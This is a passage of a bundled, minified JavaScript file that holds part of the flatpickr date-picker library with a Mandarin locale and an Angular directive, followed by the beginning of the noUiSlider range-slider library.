$(e,t){De.config[e]=t,De.redraw(),g()}function z(e,t){if(e instanceof Array)De.selectedDates=e.map(function(e){return De.parseDate(e,t)});else if(e instanceof Date||!isNaN(e))De.selectedDates=[De.parseDate(e,t)];else if(e&&e.substring)switch(De.config.mode){case"single":De.selectedDates=[De.parseDate(e,t)];break;case"multiple":De.selectedDates=e.split("; ").map(function(e){return De.parseDate(e,t)});break;case"range":De.selectedDates=e.split(De.l10n.rangeSeparator).map(function(e){return De.parseDate(e,t)})}De.selectedDates=De.selectedDates.filter(function(e){return e instanceof Date&&A(e,!1)}),De.selectedDates.sort(function(e,t){return e.getTime()-t.getTime()})}function q(e,t,n){if(0!==e&&!e)return De.clear(t);z(e,n),De.showTimeInput=De.selectedDates.length>0,De.latestSelectedDateObj=De.selectedDates[0],De.redraw(),g(),r(),le(t),t&&ne("Change")}function G(e){for(var t=e.length;t--;)"string"==typeof e[t]||+e[t]?e[t]=De.parseDate(e[t],null,!0):e[t]&&e[t].from&&e[t].to&&(e[t].from=De.parseDate(e[t].from),e[t].to=De.parseDate(e[t].to));return e.filter(function(e){return e})}function V(){De.selectedDates=[],De.now=new Date;var e=De.config.defaultDate||De.input.value;e&&z(e,De.config.dateFormat);var t=De.selectedDates.length?De.selectedDates[0]:De.config.minDate&&De.config.minDate.getTime()>De.now?De.config.minDate:De.config.maxDate&&De.config.maxDate.getTime()<De.now?De.config.maxDate:De.now;De.currentYear=t.getFullYear(),De.currentMonth=t.getMonth(),De.selectedDates.length&&(De.latestSelectedDateObj=De.selectedDates[0]),De.minDateHasTime=De.config.minDate&&(De.config.minDate.getHours()||De.config.minDate.getMinutes()||De.config.minDate.getSeconds()),De.maxDateHasTime=De.config.maxDate&&(De.config.maxDate.getHours()||De.config.maxDate.getMinutes()||De.config.maxDate.getSeconds()),Object.defineProperty(De,"latestSelectedDateObj",{get:function(){return De._selectedDateObj||De.selectedDates[De.selectedDates.length-1]},set:function(e){De._selectedDateObj=e}}),De.isMobile||Object.defineProperty(De,"showTimeInput",{get:function(){return De._showTimeInput},set:function(e){De._showTimeInput=e,De.calendarContainer&&me(De.calendarContainer,"showTimeInput",e),J()}})}function Z(){De.utils={duration:{DAY:864e5},getDaysinMonth:function(e,t){return e=void 0===e?De.currentMonth:e,t=void 0===t?De.currentYear:t,1===e&&(t%4==0&&t%100!=0||t%400==0)?29:De.l10n.daysInMonth[e]},monthToStr:function(e,t){return t=void 0===t?De.config.shorthandCurrentMonth:t,De.l10n.months[(t?"short":"long")+"hand"][e]}}}function Q(){De.formats=Object.create(FlatpickrInstance.prototype.formats),["D","F","J","M","W","l"].forEach(function(e){De.formats[e]=FlatpickrInstance.prototype.formats[e].bind(De)}),De.revFormat.F=FlatpickrInstance.prototype.revFormat.F.bind(De),De.revFormat.M=FlatpickrInstance.prototype.revFormat.M.bind(De)}function X(){if(De.input=De.config.wrap?De.element.querySelector("[data-input]"):De.element,!De.input)return console.warn("Error: invalid input element specified",De.input);De.input._type=De.input.type,De.input.type="text",De.input.classList.add("flatpickr-input"),De._input=De.input,De.config.altInput&&(De.altInput=ue(De.input.nodeName,De.input.className+" "+De.config.altInputClass),De._input=De.altInput,De.altInput.placeholder=De.input.placeholder,De.altInput.disabled=De.input.disabled,De.altInput.required=De.input.required,De.altInput.type="text",De.input.type="hidden",!De.config.static&&De.input.parentNode&&De.input.parentNode.insertBefore(De.altInput,De.input.nextSibling)),De.config.allowInput||De._input.setAttribute("readonly","readonly"),De._positionElement=De.config.positionElement||De._input}function ee(){var e=De.config.enableTime?De.config.noCalendar?"time":"datetime-local":"date";De.mobileInput=ue("input",De.input.className+" flatpickr-mobile"),De.mobileInput.step="any",De.mobileInput.tabIndex=1,De.mobileInput.type=e,De.mobileInput.disabled=De.input.disabled,De.mobileInput.placeholder=De.input.placeholder,De.mobileFormatStr="datetime-local"===e?"Y-m-d\\TH:i:S":"date"===e?"Y-m-d":"H:i:S",De.selectedDates.length&&(De.mobileInput.defaultValue=De.mobileInput.value=De.formatDate(De.selectedDates[0],De.mobileFormatStr)),De.config.minDate&&(De.mobileInput.min=De.formatDate(De.config.minDate,"Y-m-d")),De.config.maxDate&&(De.mobileInput.max=De.formatDate(De.config.maxDate,"Y-m-d")),De.input.type="hidden",De.config.altInput&&(De.altInput.type="hidden");try{De.input.parentNode.insertBefore(De.mobileInput,De.input.nextSibling)}catch(e){}De.mobileInput.addEventListener("change",function(e){De.setDate(e.target.value,!1,De.mobileFormatStr),ne("Change"),ne("Close")})}function te(){if(De.isOpen)return De.close();De.open()}function ne(e,t){var n=De.config["on"+e];if(void 0!==n&&n.length>0)for(var a=0;n[a]&&a<n.length;a++)n[a](De.selectedDates,De.input.value,De,t);"Change"===e&&(De.input.dispatchEvent(ae("change")),De.input.dispatchEvent(ae("input")))}function ae(e){return De._supportsEvents?new Event(e,{bubbles:!0}):(De._[e+"Event"]=document.createEvent("Event"),De._[e+"Event"].initEvent(e,!0,!0),De._[e+"Event"])}function ie(e){for(var t=0;t<De.selectedDates.length;t++)if(0===pe(De.selectedDates[t],e))return""+t;return!1}function re(e){return!("range"!==De.config.mode||De.selectedDates.length<2)&&(pe(e,De.selectedDates[0])>=0&&pe(e,De.selectedDates[1])<=0)}function oe(){De.config.noCalendar||De.isMobile||!De.monthNav||(De.currentMonthElement.textContent=De.utils.monthToStr(De.currentMonth)+" ",De.currentYearElement.value=De.currentYear,De._hidePrevMonthArrow=De.config.minDate&&(De.currentYear===De.config.minDate.getFullYear()?De.currentMonth<=De.config.minDate.getMonth():De.currentYear<De.config.minDate.getFullYear()),De._hideNextMonthArrow=De.config.maxDate&&(De.currentYear===De.config.maxDate.getFullYear()?De.currentMonth+1>De.config.maxDate.getMonth():De.currentYear>De.config.maxDate.getFullYear()))}function le(e){if(!De.selectedDates.length)return De.clear(e);De.isMobile&&(De.mobileInput.value=De.selectedDates.length?De.formatDate(De.latestSelectedDateObj,De.mobileFormatStr):"");var t="range"!==De.config.mode?"; ":De.l10n.rangeSeparator;De.input.value=De.selectedDates.map(function(e){return De.formatDate(e,De.config.dateFormat)}).join(t),De.config.altInput&&(De.altInput.value=De.selectedDates.map(function(e){return De.formatDate(e,De.config.altFormat)}).join(t)),!1!==e&&ne("ValueUpdate")}function ce(e){return Math.max(-1,Math.min(1,e.wheelDelta||-e.deltaY))}function se(e){e.preventDefault();var t=De.currentYearElement.parentNode.contains(e.target);if(e.target===De.currentMonthElement||t){var n=ce(e);t?(O(De.currentYear+n),e.target.value=De.currentYear):De.changeMonth(n,!0,!1)}}function de(e){var t=De.prevMonthNav.contains(e.target),n=De.nextMonthNav.contains(e.target);t||n?_(t?-1:1):e.target===De.currentYearElement?(e.preventDefault(),De.currentYearElement.select()):"arrowUp"===e.target.className?De.changeYear(De.currentYear+1):"arrowDown"===e.target.className&&De.changeYear(De.currentYear-1)}function ue(e,t,n){var a=window.document.createElement(e);return t=t||"",n=n||"",a.className=t,void 0!==n&&(a.textContent=n),a}function fe(e){return e instanceof Array?e:[e]}function me(e,t,n){if(n)return e.classList.add(t);e.classList.remove(t)}function ge(e,t,n){var a=void 0;return function(){var i=this,r=arguments;clearTimeout(a),a=setTimeout(function(){a=null,n||e.apply(i,r)},t),n&&!a&&e.apply(i,r)}}function pe(e,t,n){return e instanceof Date&&t instanceof Date&&(!1!==n?new Date(e.getTime()).setHours(0,0,0,0)-new Date(t.getTime()).setHours(0,0,0,0):e.getTime()-t.getTime())}function he(e){e.preventDefault();var t="keydown"===e.type,n=(e.type,e.type,e.target);if(De.amPM&&e.target===De.amPM)return e.target.textContent=["AM","PM"]["AM"===e.target.textContent|0];var a=Number(n.min),i=Number(n.max),r=Number(n.step),o=parseInt(n.value,10),l=o+r*(e.delta||(t?38===e.which?1:-1:Math.max(-1,Math.min(1,e.wheelDelta||-e.deltaY))||0));if(void 0!==n.value&&2===n.value.length){var c=n===De.hourElement,s=n===De.minuteElement;l<a?(l=i+l+!c+(c&&!De.amPM),s&&h(null,-1,De.hourElement)):l>i&&(l=n===De.hourElement?l-i-!De.amPM:a,s&&h(null,1,De.hourElement)),De.amPM&&c&&(1===r?l+o===23:Math.abs(l-o)>r)&&(De.amPM.textContent="PM"===De.amPM.textContent?"AM":"PM"),n.value=De.pad(l)}}var De=this;return De._={},De._.afterDayAnim=b,De._bind=c,De._compareDates=pe,De._setHoursFromDate=r,De.changeMonth=_,De.changeYear=O,De.clear=T,De.close=I,De._createElement=ue,De.destroy=S,De.isEnabled=A,De.jumpToDate=g,De.open=H,De.redraw=K,De.set=$,De.setDate=q,De.toggle=te,function(){De.element=De.input=e,De.instanceConfig=t||{},De.parseDate=FlatpickrInstance.prototype.parseDate.bind(De),De.formatDate=FlatpickrInstance.prototype.formatDate.bind(De),Q(),W(),B(),X(),V(),Z(),De.isOpen=!1,De.isMobile=!De.config.disableMobile&&!De.config.inline&&"single"===De.config.mode&&!De.config.disable.length&&!De.config.enable.length&&!De.config.weekNumbers&&/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),De.isMobile||v(),d(),(De.selectedDates.length||De.config.noCalendar)&&(De.config.enableTime&&r(De.config.noCalendar?De.latestSelectedDateObj||De.config.minDate:null),le()),De.showTimeInput=De.selectedDates.length>0||De.config.noCalendar,De.config.weekNumbers&&(De.calendarContainer.style.width=De.daysContainer.offsetWidth+De.weekWrapper.offsetWidth+"px"),De.isMobile||J(),ne("Ready")}(),De}function _flatpickr(e,t){for(var n=Array.prototype.slice.call(e),a=[],i=0;i<n.length;i++)try{if(null!==n[i].getAttribute("data-fp-omit"))continue;n[i]._flatpickr&&(n[i]._flatpickr.destroy(),n[i]._flatpickr=null),n[i]._flatpickr=new FlatpickrInstance(n[i],t||{}),a.push(n[i]._flatpickr)}catch(e){console.warn(e,e.stack)}return 1===a.length?a[0]:a}function flatpickr(e,t){return e instanceof NodeList?_flatpickr(e,t):e instanceof HTMLElement?_flatpickr([e],t):_flatpickr(window.document.querySelectorAll(e),t)}var _extends=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},_typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e};FlatpickrInstance.prototype={formats:{Z:function(e){return e.toISOString()},D:function(e){return this.l10n.weekdays.shorthand[this.formats.w(e)]},F:function(e){return this.utils.monthToStr(this.formats.n(e)-1,!1)},G:function(e){return FlatpickrInstance.prototype.pad(FlatpickrInstance.prototype.formats.h(e))},H:function(e){return FlatpickrInstance.prototype.pad(e.getHours())},J:function(e){return e.getDate()+this.l10n.ordinal(e.getDate())},K:function(e){return e.getHours()>11?"PM":"AM"},M:function(e){return this.utils.monthToStr(e.getMonth(),!0)},S:function(e){return FlatpickrInstance.prototype.pad(e.getSeconds())},U:function(e){return e.getTime()/1e3},W:function(e){return this.config.getWeek(e)},Y:function(e){return e.getFullYear()},d:function(e){return FlatpickrInstance.prototype.pad(e.getDate())},h:function(e){return e.getHours()%12?e.getHours()%12:12},i:function(e){return FlatpickrInstance.prototype.pad(e.getMinutes())},j:function(e){return e.getDate()},l:function(e){return this.l10n.weekdays.longhand[e.getDay()]},m:function(e){return FlatpickrInstance.prototype.pad(e.getMonth()+1)},n:function(e){return e.getMonth()+1},s:function(e){return e.getSeconds()},w:function(e){return e.getDay()},y:function(e){return String(e.getFullYear()).substring(2)}},formatDate:function(e,t){var n=this;return void 0!==this.config&&void 0!==this.config.formatDate?this.config.formatDate(e,t):t.split("").map(function(t,a,i){return n.formats[t]&&"\\"!==i[a-1]?n.formats[t](e):"\\"!==t?t:""}).join("")},revFormat:{D:function(){},F:function(e,t){e.setMonth(this.l10n.months.longhand.indexOf(t))},G:function(e,t){e.setHours(parseFloat(t))},H:function(e,t){e.setHours(parseFloat(t))},J:function(e,t){e.setDate(parseFloat(t))},K:function(e,t){var n=e.getHours();12!==n&&e.setHours(n%12+12*/pm/i.test(t))},M:function(e,t){e.setMonth(this.l10n.months.shorthand.indexOf(t))},S:function(e,t){e.setSeconds(t)},U:function(e,t){return new Date(1e3*parseFloat(t))},W:function(e,t){return t=parseInt(t),new Date(e.getFullYear(),0,2+7*(t-1),0,0,0,0,0)},Y:function(e,t){e.setFullYear(t)},Z:function(e,t){return new Date(t)},d:function(e,t){e.setDate(parseFloat(t))},h:function(e,t){e.setHours(parseFloat(t))},i:function(e,t){e.setMinutes(parseFloat(t))},j:function(e,t){e.setDate(parseFloat(t))},l:function(){},m:function(e,t){e.setMonth(parseFloat(t)-1)},n:function(e,t){e.setMonth(parseFloat(t)-1)},s:function(e,t){e.setSeconds(parseFloat(t))},w:function(){},y:function(e,t){e.setFullYear(2e3+parseFloat(t))}},tokenRegex:{D:"(\\w+)",F:"(\\w+)",G:"(\\d\\d|\\d)",H:"(\\d\\d|\\d)",J:"(\\d\\d|\\d)\\w+",K:"(am|AM|Am|aM|pm|PM|Pm|pM)",M:"(\\w+)",S:"(\\d\\d|\\d)",U:"(.+)",W:"(\\d\\d|\\d)",Y:"(\\d{4})",Z:"(.+)",d:"(\\d\\d|\\d)",h:"(\\d\\d|\\d)",i:"(\\d\\d|\\d)",j:"(\\d\\d|\\d)",l:"(\\w+)",m:"(\\d\\d|\\d)",n:"(\\d\\d|\\d)",s:"(\\d\\d|\\d)",w:"(\\d\\d|\\d)",y:"(\\d{2})"},pad:function(e){return("0"+e).slice(-2)},parseDate:function(e,t,n){if(0!==e&&!e)return null;var a=e;if(e instanceof Date)e=new Date(e.getTime());else if(void 0!==e.toFixed)e=new Date(e);else{var i=t||(this.config||flatpickr.defaultConfig).dateFormat;if("today"===(e=String(e).trim()))e=new Date,n=!0;else if(/Z$/.test(e)||/GMT$/.test(e))e=new Date(e);else if(this.config&&this.config.parseDate)e=this.config.parseDate(e,i);else{for(var r=this.config&&this.config.noCalendar?new Date((new Date).setHours(0,0,0,0)):new Date((new Date).getFullYear(),0,1,0,0,0,0),o=void 0,l=0,c=0,s="";l<i.length;l++){var d=i[l],u="\\"===d,f="\\"===i[l-1]||u;if(this.tokenRegex[d]&&!f){s+=this.tokenRegex[d];var m=new RegExp(s).exec(e);m&&(o=!0)&&(r=this.revFormat[d](r,m[++c])||r)}else u||(s+=".")}e=o?r:null}}return e instanceof Date?(!0===n&&e.setHours(0,0,0,0),e):(console.warn("flatpickr: invalid date "+a),console.info(this.element),null)}},"undefined"!=typeof HTMLElement&&(HTMLCollection.prototype.flatpickr=NodeList.prototype.flatpickr=function(e){return _flatpickr(this,e)},HTMLElement.prototype.flatpickr=function(e){return _flatpickr([this],e)}),flatpickr.defaultConfig=FlatpickrInstance.defaultConfig={mode:"single",position:"auto",animate:-1===window.navigator.userAgent.indexOf("MSIE"),wrap:!1,weekNumbers:!1,allowInput:!1,clickOpens:!0,closeOnSelect:!0,time_24hr:!1,enableTime:!1,noCalendar:!1,dateFormat:"Y-m-d",ariaDateFormat:"F j, Y",altInput:!1,altInputClass:"form-control input",altFormat:"F j, Y",defaultDate:null,minDate:null,maxDate:null,parseDate:null,formatDate:null,getWeek:function(e){var t=new Date(e.getTime()),n=new Date(t.getFullYear(),0,1);return Math.ceil(((t-n)/864e5+n.getDay()+1)/7)},enable:[],disable:[],shorthandCurrentMonth:!1,inline:!1,static:!1,appendTo:null,prevArrow:"<svg version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 17 17'><g></g><path d='M5.207 8.471l7.146 7.147-0.707 0.707-7.853-7.854 7.854-7.853 0.707 0.707-7.147 7.146z' /></svg>",nextArrow:"<svg version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 17 17'><g></g><path d='M13.207 8.472l-7.854 7.854-0.707-0.707 7.146-7.146-7.146-7.148 0.707-0.707 7.854 7.854z' /></svg>",enableSeconds:!1,hourIncrement:1,minuteIncrement:5,defaultHour:12,defaultMinute:0,disableMobile:!1,locale:"default",plugins:[],ignoredFocusElements:[],onClose:void 0,onChange:void 0,onDayCreate:void 0,onMonthChange:void 0,onOpen:void 0,onParseConfig:void 0,onReady:void 0,onValueUpdate:void 0,onYearChange:void 0,onKeyDown:void 0,onDestroy:void 0},flatpickr.l10ns={en:{weekdays:{shorthand:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],longhand:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"]},months:{shorthand:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],longhand:["January","February","March","April","May","June","July","August","September","October","November","December"]},daysInMonth:[31,28,31,30,31,30,31,31,30,31,30,31],firstDayOfWeek:0,ordinal:function(e){var t=e%100;if(t>3&&t<21)return"th";switch(t%10){case 1:return"st";case 2:return"nd";case 3:return"rd";default:return"th"}},rangeSeparator:" ~ ",weekAbbreviation:"Wk",scrollTitle:"Scroll to increment",toggleTitle:"Click to toggle"}},flatpickr.l10ns.default=Object.create(flatpickr.l10ns.en),flatpickr.localize=function(e){return _extends(flatpickr.l10ns.default,e||{})},flatpickr.setDefaults=function(e){return _extends(flatpickr.defaultConfig,e||{})},"undefined"!=typeof jQuery&&(jQuery.fn.flatpickr=function(e){return _flatpickr(this,e)}),Date.prototype.fp_incr=function(e){return new Date(this.getFullYear(),this.getMonth(),this.getDate()+parseInt(e,10))},"undefined"!=typeof module&&(module.exports=flatpickr);
/* Mandarin locals for flatpickr */
var flatpickr = flatpickr || { l10ns: {} };
flatpickr.l10ns.zh = {};

flatpickr.l10ns.zh.weekdays = {
	shorthand: ["周日", "周一", "周二", "周三", "周四", "周五", "周六"],
	longhand: ["星期日", "星期一", "星期二", "星期三", "星期四", "星期五", "星期六"]
};

flatpickr.l10ns.zh.months = {
	shorthand: ["一月", "二月", "三月", "四月", "五月", "六月", "七月", "八月", "九月", "十月", "十一月", "十二月"],
	longhand: ["一月", "二月", "三月", "四月", "五月", "六月", "七月", "八月", "九月", "十月", "十一月", "十二月"]
};

flatpickr.l10ns.zh.rangeSeparator = " 至 ";
flatpickr.l10ns.zh.weekAbbreviation = "周";
flatpickr.l10ns.zh.scrollTitle = "滚动切换";
flatpickr.l10ns.zh.toggleTitle = "点击切换 12/24 小时时制";

if (typeof module !== "undefined") module.exports = flatpickr.l10ns;
!function(t,n){"use strict";t["angular-flatpickr"]=n(t.angular,t.flatpickr)}(this,function(t){"use strict";var n=t.module("angular-flatpickr",[]);return n.directive("ngFlatpickr",[function(){return{require:"ngModel",restrict:"A",scope:{fpOpts:"&",fpOnSetup:"&"},link:function(t,n){var r=new FlatpickrInstance(n[0],t.fpOpts());t.fpOnSetup&&t.fpOnSetup({fpItem:r}),n.on("$destroy",function(){r.destroy()})}}}]),n});
//# sourceMappingURL=ng-flatpickr.min.js.map

/*! nouislider - 14.1.1 - 12/15/2019 */
!function(t){"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?module.exports=t():window.noUiSlider=t()}(function(){"use strict";var lt="14.1.1";function ut(t){t.parentElement.removeChild(t)}function s(t){return null!=t}function ct(t){t.preventDefault()}function i(t){return"number"==typeof t&&!isNaN(t)&&isFinite(t)}function pt(t,e,r){0<r&&(ht(t,e),setTimeout(function(){mt(t,e)},r))}function ft(t){return Math.max(Math.min(t,100),0)}function dt(t){return Array.isArray(t)?t:[t]}function e(t){var e=(t=String(t)).split(".");return 1<e.length?e[1].length:0}function ht(t,e){t.classList?t.classList.add(e):t.className+=" "+e}function mt(t,e){t.classList?t.classList.remove(e):t.className=t.className.replace(new RegExp("(^|\\b)"+e.split(" ").join("|")+"(\\b|$)","gi")," ")}function gt(t){var e=void 0!==window.pageXOffset,r="CSS1Compat"===(t.compatMode||"");return{x:e?window.pageXOffset:r?t.documentElement.scrollLeft:t.body.scrollLeft,y:e?window.pageYOffset:r?t.documentElement.scrollTop:t.body.scrollTop}}function c(t,e){return 100/(e-t)}function p(t,e){return 100*e/(t[1]-t[0])}function f(t,e){for(var r=1;t>=e[r];)r+=1;return r}function r(t,e,r){if(r>=t.slice(-1)[0])return 100;var n,i,o=f(r,t),a=t[o-1],s=t[o],l=e[o-1],u=e[o];return l+(i=r,p(n=[a,s],n[0]<0?i+Math.abs(n[0]):i-n[0])/c(l,u))}function n(t,e,r,n){if(100===n)return n;var i,o,a=f(n,t),s=t[a-1],l=t[a];return r?(l-s)/2<n-s?l:s:e[a-1]?t[a-1]+(i=n-t[a-1],o=e[a-1],Math.round(i/o)*o):n}function o(t,e,r){var n;if("number"==typeof e&&(e=[e]),!Array.isArray(e))throw new Error("noUiSlider ("+lt+"): 'range' contains invalid value.");if(!i(n="min"===t?0:"max"===t?100:parseFloat(t))||!i(e[0]))throw new Error("noUiSlider ("+lt+"): 'range' value isn't numeric.");r.xPct.push(n),r.xVal.push(e[0]),n?r.xSteps.push(!isNaN(e[1])&&e[1]):isNaN(e[1])||(r.xSteps[0]=e[1]),r.xHighestCompleteStep.push(0)}function a(t,e,r){if(e)if(r.xVal[t]!==r.xVal[t+1]){r.xSteps[t]=p([r.xVal[t],r.xVal[t+1]],e)/c(r.xPct[t],r.xPct[t+1]);var n=(r.xVal[t+1]-r.xVal[t])/r.xNumSteps[t],i=Math.ceil(Number(n.toFixed(3))-1),o=r.xVal[t]+r.xNumSteps[t]*i;r.xHighestCompleteStep[t]=o}else r.xSteps[t]=r.xHighestCompleteStep[t]=r.xVal[t]}function l(t,e,r){var n;this.xPct=[],this.xVal=[],this.xSteps=[r||!1],this.xNumSteps=[!1],this.xHighestCompleteStep=[],this.snap=e;var i=[];for(n in t)t.hasOwnProperty(n)&&i.push([t[n],n]);for(i.length&&"object"==typeof i[0][0]?i.sort(function(t,e){return t[0][0]-e[0][0]}):i.sort(function(t,e){return t[0]-e[0]}),n=0;n<i.length;n++)o(i[n][1],i[n][0],this);for(this.xNumSteps=this.xSteps.slice(0),n=0;n<this.xNumSteps.length;n++)a(n,this.xNumSteps[n],this)}l.prototype.getMargin=function(t){var e=this.xNumSteps[0];if(e&&t/e%1!=0)throw new Error("noUiSlider ("+lt+"): 'limit', 'margin' and 'padding' must be divisible by step.");return 2===this.xPct.length&&p(this.xVal,t)},l.prototype.toStepping=function(t){return t=r(this.xVal,this.xPct,t)},l.prototype.fromStepping=function(t){return function(t,e,r){if(100<=r)return t.slice(-1)[0];var n,i=f(r,e),o=t[i-1],a=t[i],s=e[i-1],l=e[i];return n=[o,a],(r-s)*c(s,l)*(n[1]-n[0])/100+n[0]}(this.xVal,this.xPct,t)},l.prototype.getStep=function(t){return t=n(this.xPct,this.xSteps,this.snap,t)},l.prototype.getDefaultStep=function(t,e,r){var n=f(t,this.xPct);return(100===t||e&&t===this.xPct[n-1])&&(n=Math.max(n-1,1)),(this.xVal[n]-this.xVal[n-1])/r},l.prototype.getNearbySteps=function(t){var e=f(t,this.xPct);return{stepBefore:{startValue:this.xVal[e-2],step:this.xNumSteps[e-2],highestStep:this.xHighestCompleteStep[e-2]},thisStep:{startValue:this.xVal[e-1],step:this.xNumSteps[e-1],highestStep:this.xHighestCompleteStep[e-1]},stepAfter:{startValue:this.xVal[e],step:this.xNumSteps[e],highestStep:this.xHighestCompleteStep[e]}}},l.prototype.countStepDecimals=function(){var t=this.xNumSteps.map(e);return Math.max.apply(null,t)},l.prototype.convert=function(t){return this.getStep(this.toStepping(t))};var u={to:function(t){return void 0!==t&&t.toFixed(2)},from:Number};function d(t){if("object"==typeof(e=t)&&"function"==typeof e.to&&"function"==typeof e.from)return!0;var e;throw new Error("noUiSlider ("+lt+"): 'format' requires 'to' and 'from' methods.")}function h(t,e){if(!i(e))throw new Error("noUiSlider ("+lt+"): 'step' is not numeric.");t.singleStep=e}function m(t,e){if("object"!=typeof e||Array.isArray(e))throw new Error("noUiSlider ("+lt+"): 'range' is not an object.");if(void 0===e.min||void 0===e.max)throw new Error("noUiSlider ("+lt+"): Missing 'min' or 'max' in 'range'.");if(e.min===e.max)throw new Error("noUiSlider ("+lt+"): 'range' 'min' and 'max' cannot be equal.");t.spectrum=new l(e,t.snap,t.singleStep)}function g(t,e){if(e=dt(e),!Array.isArray(e)||!e.length)throw new Error("noUiSlider ("+lt+"): 'start' option is incorrect.");t.handles=e.length,t.start=e}function v(t,e){if("boolean"!=typeof(t.snap=e))throw new Error("noUiSlider ("+lt+"): 'snap' option must be a boolean.")}function b(t,e){if("boolean"!=typeof(t.animate=e))throw new Error("noUiSlider ("+lt+"): 'animate' option must be a boolean.")}function S(t,e){if("number"!=typeof(t.animationDuration=e))throw new Error("noUiSlider ("+lt+"): 'animationDuration' option must be a number.")}function x(t,e){var r,n=[!1];if("lower"===e?e=[!0,!1]:"upper"===e&&(e=[!1,!0]),!0===e||!1===e){for(r=1;r<t.handles;r++)n.push(e);n.push(!1)}else{if(!Array.isArray(e)||!e.length||e.length!==t.handles+1)throw new Error("noUiSlider ("+lt+"): 'connect' option doesn't match handle count.");n=e}t.connect=n}function w(t,e){switch(e){case"horizontal":t.ort=0;break;case"vertical":t.ort=1;break;default:throw new Error("noUiSlider ("+lt+"): 'orientation' option is invalid.")}}function y(t,e){if(!i(e))throw new Error("noUiSlider ("+lt+"): 'margin' option must be numeric.");if(0!==e&&(t.margin=t.spectrum.getMargin(e),!t.margin))throw new Error("noUiSlider ("+lt+"): 'margin' option is only supported on linear sliders.")}function E(t,e){if(!i(e))throw new Error("noUiSlider ("+lt+"): 'limit' option must be numeric.");if(t.limit=t.spectrum.getMargin(e),!t.limit||t.handles<2)throw new Error("noUiSlider ("+lt+"): 'limit' option is only supported on linear sliders with 2 or more handles.")}function C(t,e){if(!i(e)&&!Array.isArray(e))throw new Error("noUiSlider ("+lt+"): 'padding' option must be numeric or array of exactly 2 numbers.");if(Array.isArray(e)&&2!==e.length&&!i(e[0])&&!i(e[1]))throw new Error("noUiSlider ("+lt+"): 'padding' option must be numeric or array of exactly 2 numbers.");if(0!==e){if(Array.isArray(e)||(e=[e,e]),!(t.padding=[t.spectrum.getMargin(e[0]),t.spectrum.getMargin(e[1])])===t.padding[0]||!1===t.padding[1])throw new Error("noUiSlider ("+lt+"): 'padding' option is only supported on linear sliders.");if(t.padding[0]<0||t.padding[1]<0)throw new Error("noUiSlider ("+lt+"): 'padding' option must be a positive number(s).");if(100<t.padding[0]+t.padding[1])throw new Error("noUiSlider ("+lt+"): 'padding' option must not exceed 100% of the range.")}}function N(t,e){switch(e){case"ltr":t.dir=0;break;case"rtl":t.dir=1;break;default:throw new Error("noUiSlider ("+lt+"): 'direction' option was not recognized.")}}function U(t,e){if("string"!=typeof e)throw new Error("noUiSlider ("+lt+"): 'behaviour' must be a string containing options.");var r=0<=e.indexOf("tap"),n=0<=e.indexOf("drag"),i=0<=e.indexOf("fixed"),o=0<=e.indexOf("snap"),a=0<=e.indexOf("hover"),s=0<=e.indexOf("unconstrained");if(i){if(2!==t.handles)throw new Error("noUiSlider ("+lt+"): 'fixed' behaviour must be used with 2 handles");y(t,t.start[1]-t.start[0])}if(s&&(t.margin||t.limit))throw new Error("noUiSlider ("+lt+"): 'unconstrained' behaviour cannot be used with margin or limit");t.events={tap:r||o,drag:n,fixed:i,snap:o,hover:a,unconstrained:s}}function P(t,e){if(!1!==e)if(!0===e){t.tooltips=[];for(var r=0;r<t.handles;r++)t.tooltips.push(!0)}else{if(t.tooltips=dt(e),t.tooltips.length!==t.handles)throw new Error("noUiSlider ("+lt+"): must pass a formatter for all handles.");t.tooltips.forEach(function(t){if("boolean"!=typeof t&&("object"!=typeof t||"function"!=typeof t.to))throw new Error("noUiSlider ("+lt+"): 'tooltips' must be passed a formatter or 'false'.")})}}function V(t,e){d(t.ariaFormat=e)}function k(t,e){d(t.format=e)}function A(t,e){if("boolean"!=typeof(t.keyboardSupport=e))throw new Error("noUiSlider ("+lt+"): 'keyboardSupport' option must be a boolean.")}function M(t,e){t.documentElement=e}function O(t,e){if("string"!=typeof e&&!1!==e)throw new Error("noUiSlider ("+lt+"): 'cssPrefix' must be a string or `false`.");t.cssPrefix=e}function L(t,e){if("object"!=typeof e)throw new Error("noUiSlider ("+lt+"): 'cssClasses' must be an object.");if("string"==typeof t.cssPrefix)for(var r in t.cssClasses={},e)e.hasOwnProperty(r)&&(t.cssClasses[r]=t.cssPrefix+e[r]);else t.cssClasses=e}function vt(e){var r={margin:0,limit:0,padding:0,animate:!0,animationDuration:300,ariaFormat:u,format:u},n={step:{r:!1,t:h},start:{r:!0,t:g},connect:{r:!0,t:x},direction:{r:!0,t:N},snap:{r:!1,t:v},animate:{r:!1,t:b},animationDuration:{r:!1,t:S},range:{r:!0,t:m},orientation:{r:!1,t:w},margin:{r:!1,t:y},limit:{r:!1,t:E},padding:{r:!1,t:C},behaviour:{r:!0,t:U},ariaFormat:{r:!1,t:V},format:{r:!1,t:k},tooltips:{r:!1,t:P},keyboardSupport:{r:!0,t:A},documentElement:{r:!1,t:M},cssPrefix:{r:!0,t:O},cssClasses:{r:!0,t:L}},i={connect:!1,direction:"ltr",behaviour:"tap",orientation:"horizontal",keyboardSupport:!0,cssPrefix:"noUi-",cssClasses:{target:"target",base:"base",origin:"origin",handle:"handle",handleLower:"handle-lower",handleUpper:"handle-upper",touchArea:"touch-area",horizontal:"horizontal",vertical:"vertical",background:"background",connect:"connect",connects:"connects",ltr:"ltr",rtl:"rtl",textDirectionLtr:"txt-dir-ltr",textDirectionRtl:"txt-dir-rtl",draggable:"draggable",drag:"state-drag",tap:"state-tap",active:"active",tooltip:"tooltip",pips:"pips",pipsHorizontal:"pips-horizontal",pipsVertical:"pips-v